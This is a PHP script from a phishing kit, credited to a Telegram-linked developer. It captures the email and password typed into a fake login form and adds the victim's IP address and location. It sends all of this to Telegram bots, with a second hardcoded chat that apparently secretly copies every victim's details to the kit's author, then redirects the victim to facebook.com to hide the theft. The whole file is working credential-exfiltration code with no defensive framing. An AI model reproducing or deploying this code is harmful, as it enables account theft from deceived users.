<?php
flush();
ob_start();
set_time_limit(0);
ob_get_contents();
error_reporting(0);
ob_implicit_flush(1);
$min_seconds_between_refreshes = 10;
session_start();


include "Nova.php";
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$time = date("Y-m-d H:i:s");
$phone = $_POST['phone'];
$playid = $_POST['playid'];
date_default_timezone_set('Africa/Cairo');
$date = date("Y/m/d h:i:s");
// get ip
function getClientIP() {
$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';
return $ipaddress;
}
$ip = getClientIP();
$location = get_geolocation($ip);
$apiGL = json_decode($location, true);
function get_geolocation($ip) {
    $url = "https://ip-api.io/json/".$ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Accept: application/json',
        'User-Agent: '.$_SERVER['HTTP_USER_AGENT']
    ));
    return curl_exec($ch);
}
// info
$country = file_get_contents("https://ipapi.co/".$ip."/country_name");

$city = $apiGL['city'];
 $ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");

$countrycode = $apiGL['country_code'];
$flag = $apiGL['emojiFlag'];
$token = "my-token";
$id = "my-id";
$msg = "
➥𝙷𝙸 𝙱𝚁𝙾 𝚈𝙾𝚄 𝙶𝙴𝚃 𝙰 𝙽𝙴𝚆 𝙰𝙲𝙲𝙾𝚄𝙽𝚃
━━━━━━━━━━━━━━━━━
➥ 𝙸𝙽𝙳𝙴𝚇 » 𝙻𝙴𝙳𝙾
➥ ʟᴏɢɪɴ » $login
➥ ᴇᴍᴀɪʟ » `$email`
➥ ᴘᴀssᴡᴏʀᴅ » `$password`
➥ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ » $flag `$ccode`
➥ ᴄᴏᴜɴᴛʀʏ ɴᴀᴍᴇ » $country
➥ ɪᴘ » `$ip`
➥ ᴅᴀᴛᴇ » $time
━━━━━━━━━━━━━━━━━
𝐃𝐄𝐕 ➦  [ Seaf sindhi ](t.me/s0_32) 
";
$mesg = ['chat_id'=>$id,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?".$message);
header('Location: https://www.facebook.com');

$token2 = "<TOKEN_REMOVED>";

$id2 = 1796238170; 

$mesg = ['chat_id'=>$id2,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token2/sendMessage?".$message);
header('Location: https://www.facebook.com');
?>